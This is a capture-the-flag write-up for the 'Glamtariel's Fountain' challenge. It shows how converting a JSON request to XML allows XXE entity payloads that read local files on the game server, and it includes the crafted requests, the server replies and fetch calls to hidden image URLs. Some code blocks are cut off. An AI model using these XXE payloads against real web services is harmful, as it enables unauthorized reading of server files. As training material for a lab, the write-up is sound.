Stare into Glamtariel's fountain and see if you can find the ring! What is the filename of the ring she presents you? Talk to Hal Tandybuck in the Web Ring for hints.

Difficulty: 5/5

## Chat with Fitzy Akbowl
Huh - what? Why do you disturb Akbowl?

I'm trying to get the ring in here for the Sporc Chief.

Unlucky for me it's lost in this water basin thing.

You will not get it out before Akbowl!

Whenever we drop an object on either the princess or the fountain we see JSON requests getting triggered which look like this:

```
{"imgDrop":"img1","who":"princess","reqType":"json"}
```

HINT:
>Sometimes we can hit web pages with XXE when they aren't expecting it!

let's convert the JSON request to an XML request and try sending this modified request.

```
<?xml version="1.0" encoding="UTF-8" ?>
<root>
	<imgDrop>img1</imgDrop>
	<who>princess</who>
	<reqType>xml</reqType>
</root>
```

Remember to change the content-type of the request too! On sending this request, we get the following response.

```
{
  "appResp": "I love rings of all colors!^She definitely tries to convince everyone that the blue ones are her favorites. I'm not so sure though.",
  "droppedOn": "none",
  "visit": "none"
}
```

We know to try XXE from the hint. Also based on the clues from the princess and the fountain we are looking for a ringlist.txt. After experimenting with locations to try XXE as well as guessing possible paths, the following request works and we get a differenct repsonse from the server.

```
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE foo [<!ELEMENT foo ANY > 
<!ENTITY xxe SYSTEM "file:///app/static/images/ringlist.txt"> ]>
<root>
 <imgDrop>&xxe;</imgDrop>
 <who>princess</who>
 <reqType>xml</reqType>
</root>
```

```
{
  "appResp": "Ah, you found my ring list! Gold, red, blue - so many colors! Glad I don't keep any secrets in it any more! Please though, don't tell anyone about this.^She really does try to keep things safe. Best just to put it away. (click)",
  "droppedOn": "none",
  "visit": "static/images/pholder-morethantopsupersecret63842.png,262px,100px"
}
```

The visit parameter in the response points to a URL. Let's visit that.
```
await fetch("https://glamtarielsfountain.com/static/images/pholder-morethantopsupersecret63842.png", {
    "credentials": "include",
    "headers": {

The image hints of the existence of a folder called `x_phial_pholder_2022` within which reside files
`bluering.txt` and `redring.txt`. Let's issue requests for these files.

```
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE foo [<!ELEMENT foo ANY > 
<!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/redring.txt"> ]>
<root>
 <imgDrop>&xxe;</imgDrop>
 <who>princess</who>
 ```

 ```
 {
  "appResp": "Hmmm, you still seem awfully interested in these rings. I can't blame you, they are pretty nice.^Oooooh, I can just tell she'd like to talk about them some more.",
  "droppedOn": "none",
  "visit": "none"
}
```

```
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE foo [<!ELEMENT foo ANY > 
<!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/bluering.txt"> ]>
<root>
 <imgDrop>&xxe;</imgDrop>
 <who>princess</who>
 <reqType>xml</reqType>
</root>
```

```
{
  "appResp": "I love these fancy blue rings! You can see we have two of them. Not magical or anything, just really pretty.^She definitely tries to convince everyone that the blue ones are her favorites. I'm not so sure though.",
  "droppedOn": "none",
  "visit": "none"
}

```

Issue a request for silver ring too (just an intuituve guess).

```
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE foo [<!ELEMENT foo ANY > 
<!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/silverring.txt"> ]>
<root>
 <imgDrop>&xxe;</imgDrop>
 <who>princess</who>
 <reqType>xml</reqType>
</root>
```

```
{
  "appResp": "I'd so love to add that silver ring to my collection, but what's this? Someone has defiled my red ring! Click it out of the way please!.^Can't say that looks good. Someone has been up to no good. Probably that miserable Grinchum!",
  "droppedOn": "none",
  "visit": "static/images/x_phial_pholder_2022/redring-supersupersecret928164.png,267px,127px"
}
```
The visit parameter in the response points to a URL. Let's visit that.
```
await fetch("https://glamtarielsfountain.com/static/images/x_phial_pholder_2022/redring-supersupersecret928164.png,267px,127px", {
    "credentials": "include",
    "headers": {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0",
        "Accept": "image/avif,image/webp,*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Sec-Fetch-Dest": "image",
        "Sec-Fetch-Mode": "no-cors",

        "Cache-Control": "no-cache"
    },
    "referrer": "https://glamtarielsfountain.com/",
    "method": "GET",
    "mode": "cors"
});
```

On closer inspection we find that the writing on the ring says `goldring_to_be_deleted.txt`. Let's issue a request for this file.

```
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE foo [<!ELEMENT foo ANY > 
<!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt"> ]>
<root>
 <imgDrop>&xxe;</imgDrop>
 <who>princess</who>
 <reqType>xml</reqType>
</root>
```

```
{
  "appResp": "Hmmm, and I thought you wanted me to take a look at that pretty silver ring, but instead, you've made a pretty bold REQuest. That's ok, but even if I knew anything about such things, I'd only use a secret TYPE of tongue to discuss them.^She's definitely hiding something.",
  "droppedOn": "none",
  "visit": "none"
}
```
based on the REQYPE hint above, let's change the postion of the XXE to the reqtype element. Also let's drop the silver ring (img1).

```
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE foo [<!ELEMENT foo ANY > 
<!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt"> ]>
<root>
 <imgDrop>img1</imgDrop>
 <who>princess</who>
 <reqType>&xxe;</reqType>
</root>
```

```
{
  "appResp": "No, really I couldn't. Really? I can have the beautiful silver ring? I shouldn't, but if you insist, I accept! In return, behold, one of Kringle's golden rings! Grinchum dropped this one nearby. Makes one wonder how 'precious' it really was to him. Though I haven't touched it myself, I've been keeping it safe until someone trustworthy such as yourself came along. Congratulations!^Wow, I have never seen that before! She must really trust you!",
  "droppedOn": "none",
  "visit": "static/images/x_phial_pholder_2022/goldring-morethansupertopsecret76394734.png,200px,290px"
}

Issue a request to the URL in the visit parameter of the response to get the ring!

```

## Rejoice
No! That's not yours!

This birdbath showed me images of this happening.

But I didn't believe it because nobody is better than Akbowl!

Akbowl's head is the hardest! That's what the other sporcs tell me.

I guess Akbowl's head is not the smartest.

## Chat with Grinchum
